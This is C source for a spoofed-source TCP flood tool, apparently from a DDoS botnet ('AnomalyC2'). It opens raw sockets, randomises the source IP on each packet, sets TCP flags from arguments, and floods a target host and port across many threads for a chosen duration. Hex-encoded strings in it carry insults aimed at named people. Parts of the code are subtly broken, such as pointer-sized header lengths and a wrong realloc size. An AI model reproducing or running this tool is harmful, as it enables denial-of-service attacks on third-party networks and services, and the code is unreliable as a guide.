#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <linux/ip.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

#define INET_ADDR(o1, o2, o3, o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

//spoofed tcp hex method coded by AnomalyC2

typedef struct args {
    in_addr_t host;

    int port, seconds;

    char **args;
    int argc;
} args_t;

int count = 0;
char **strings;

static uint32_t x, y, z, w;

void rand_init(void) {
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) {
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

static in_addr_t get_random_ip(void) {
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;


    tmp = rand_next();

    o1 = tmp & 0xff;
    o2 = (tmp >> 8) & 0xff;
    o3 = (tmp >> 16) & 0xff;
    o4 = (tmp >> 24) & 0xff;
    
    return INET_ADDR(o1,o2,o3,o4);
}

static void add_string(char *string, int len) {
    strings = realloc(strings, (count + 1) + len);
    strings[count++] = string;
}

static void init_strings(void) {
    add_string("\x61\x62\x63\x31\x32\x33", 6);
    add_string("\x6d\x61\x72\x6b\x75\x73\x20\x69\x73\x20\x67\x61\x79", 14);
    add_string("\x75\x72\x30\x61\x20\x69\x73\x20\x61\x20\x73\x6b\x69\x64", 15);
}

static char *rand_string(void) {
    return strings[rand_next() % count];
}

static char *_strlchr(char *str, char c) {
    int len = strlen(str), i;

    for(i = len; i > 0; i--) {
        if(str[i] == c)
            break;
        
        str[i] = 0;
    }

    str[i] = 0;

    return str;
}

static char *_strchr(char *str, char c) {
    while(*str) {
        if(*str++ == c)
            break;
    }
    
    return str;
}


static int atk_get_int(char *str, char **args, int count) {
    char *buf, *rbuf, tmp[256];
    
    for(int i = 0; i < count; i++) {
        strncpy(tmp, args[i], sizeof(tmp));
        buf = _strlchr(args[i], '=');
        
        if(!strcmp(buf, str)) {
            rbuf = _strchr(tmp, '=');
            
            return atoi(rbuf);
        }
    }

    return -1;
}

static void atk_watch(int seconds) { //higher pps
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        sleep(seconds);
        kill(getppid(), 9);
    }
}

static void remake_packet(struct iphdr *iph, struct tcphdr *tcph) {
    iph->saddr = get_random_ip();

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, iph->tot_len);


    tcph->source = (rand_next() & 0xfff - 1) + 1;
    tcph->seq++;

    char *string = rand_string();
    int len = strlen(string);

    memcpy((void *)tcph, string, len);
}

static void *atk_tcphex(void *arg) {
    args_t *args = (args_t *)arg;

    int sock;
    if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return 0;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int)) < 0) {
        perror("setsockopt");
        return 0;
    }

    char rdbuf[1024];

    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct tcphdr *tcph = (struct tcphdr *) (rdbuf + sizeof(iph));

    struct sockaddr_in addr = {
        .sin_addr.s_addr = args->host,
        .sin_port = htons(args->port),
        .sin_family = AF_INET
    };

    iph->daddr = args->host;

    iph->ihl = 5;
    iph->ttl = 64;
    iph->id = rand_next();
    iph->version = 4;
    iph->protocol = IPPROTO_TCP;

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

    iph->tot_len = sizeof(iph) + sizeof(tcph) + sizeof(rdbuf);


    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->dest = htons(args->port);

    tcph->check = 0;
    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

    tcph->fin = atk_get_int("fin", args->args, args->argc) == -1 ? 0 : 1;
    tcph->syn = atk_get_int("syn", args->args, args->argc) == -1 ? 0 : 1;
    tcph->rst = atk_get_int("rst", args->args, args->argc) == -1 ? 0 : 1;
    tcph->psh = atk_get_int("psh", args->args, args->argc) == -1 ? 0 : 1;
    tcph->ack = atk_get_int("ack", args->args, args->argc) == -1 ? 0 : 1;
    tcph->urg = atk_get_int("urg", args->args, args->argc) == -1 ? 0 : 1;

    atk_watch(args->seconds);

    while(1) {
        remake_packet(iph, tcph);

        sendto(sock, rdbuf, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
    }
}

int main(int argc, char **argv) {
    if(argc < 5) {
        printf("Usage: invalid args!\r\n%s [ip] [port] [time] [threads]\r\nExample: %s 1.1.1.1 80 20 16\r\n", argv[0], argv[0]);

        return -1;
    }

    in_addr_t host;
    int port, seconds, threads;

    if(!(host = inet_addr(argv[1]))) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }
    else if((port = atoi(argv[2])) > 65535 || port < 1) {
        printf("[main] %s is invalid\r\n", argv[2]);

        return -1;
    }
    else if((seconds = atoi(argv[3])) < 1) {
        printf("[main] %s is invalid\r\n", argv[3]);

        return -1;
    }
    else if((threads = atoi(argv[4])) < 1) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }

    rand_init();
    init_strings();

    puts("[main] initiated strings");

    if(threads > 200)
        puts("[warning] threads are high");

    args_t args = {
        .host = host,
        .port = port,
        .seconds = seconds,
        .args = argv,
        .argc = argc
    };

    pthread_t thread[threads];
    
    for(int i = 0; i < threads; i++)
        pthread_create(&thread[i], NULL, atk_tcphex, (void *)&args);
    
    printf("[main] started: %d threads\n", threads);

    sleep(args.seconds);
}

